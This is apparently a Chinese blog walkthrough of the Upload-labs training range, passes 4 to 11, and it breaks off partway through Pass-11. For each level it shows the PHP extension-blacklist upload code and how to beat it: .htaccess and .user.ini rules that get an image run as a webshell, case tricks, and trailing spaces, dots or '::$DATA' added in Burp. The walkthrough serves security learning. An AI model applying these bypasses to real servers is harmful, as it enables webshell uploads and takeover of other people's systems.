<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现相比于第三关黑名单多了很多，这次不能用<code>php</code>版本绕过</p>
<p>那么可以用<code>.htaccess</code>配置文件攻击</p>
<p>先打开配置文件</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230714183608395.png"></p>
<p>启用AllowOverride</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230714183649063.png"></p>
<p>创建<code>.htaccess</code>文件，写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &#x27;1.jpg&#x27;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>上传后可以匹配到<code>1.jpg</code>，然后被当成<code>php</code>文件解析</p>
<p>我们先上传<code>.htaccess</code>文件</p>
<p>上传成功后，再上传<code>1.jpg</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230714201955747.png"></p>
<p>由于<code>phpstudy</code>是新版本，对<code>.htaccess</code>支持存在问题，会出现返回值为空</p>
<p>也就是说<code>.htaccess</code>文件没有上传成功(算是<code>getshell</code>，就是有点无语。。)</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现.htaccess文件被办了</p>
<p>发现<code>.ini</code>文件没有被禁用，又因为提示<code>上传目录存在php文件（readme.php）</code></p>
<p>我们可以上传<code>.ini</code>文件，让所有<code>php文件</code>都“自动”包含某个文件(比如一句话木马)</p>
<p>不过前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php文件</code></p>
<p>创建<code>.user.ini</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure>

<p>上传成功后，再上传1.jpg</p>
<p>我们再访问<code>../upload/readme.php</code>(因为我们的一句话木马包含在<code>readme.php</code>)</p>
<p>成功<code>getshell</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230715113621487.png"></p>
<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>.ini</code>被办了，直接卡住。。</p>
<p>仔细发现过滤条件少了大小写转换</p>
<p>结合黑名单，我们可以上传<code>.Php</code>文件绕过</p>
<p>上传成功</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230715114806040.png"></p>
<p>出现服务器配置问题，有点无语</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230715115649445.png"></p>
<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现过滤条件少了去空格</p>
<p>思路很清晰，bp抓包手动添加空格(<strong>重命名windows系统会吞掉空格</strong>)</p>
<p>上传<code>1.php</code>文件，添加空格</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230715120712618.png"></p>
<p>成功绕过</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230715120745203.png"></p>
<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相比于前几关，发现过滤少了去除<code>.</code></p>
<p>那么我们可以用<code>1.php.</code>绕过</p>
<p>bp抓包手动添加<code>.</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230715235905746.png"></p>
<p>访问<code>../upload/1.php.</code>，成功绕过</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230716000011001.png"></p>
<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相比于前一关，发现少了过滤条件去除字符串<code>::$DATA</code></p>
<p><code>::$DATA</code>是一个流传输,可以把后面的数据当成流处理和<code>.</code>，<code>(空格)</code>类似</p>
<p>那么我们可以先上传<code>1.php</code>然后抓包手动添加<code>::$DATA</code></p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230716000432970.png"></p>
<p>访问<code>../upload/202307160004185100.php</code>，成功绕过</p>
<p>（注意访问路径不带有<code>::$DATA</code>）</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230716000532788.png"></p>
<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据提示，发现只允许上传.jpg|.png|.gif后缀的文件！</p>
<p>但是<code>.htaccess</code>，<code>.ini</code>文件都被办了</p>
<p>结合<code>deldot函数</code>，我们可以上传<code>1.php. .</code>绕过</p>
<p>因为<code>deldot函数</code>从后往前检测，检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</p>
<p>这样我们既绕过了去除点号，也绕过了去除空格</p>
<p>bp抓包，手动修改</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230716121536326.png"></p>
<p>访问<code>../upload/1.php.(空格)</code>，成功绕过	</p>
<p><img src="/article/Upload-labs%E9%9D%B6%E5%9C%BA/image-20230716121928105.png"></p>
<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span 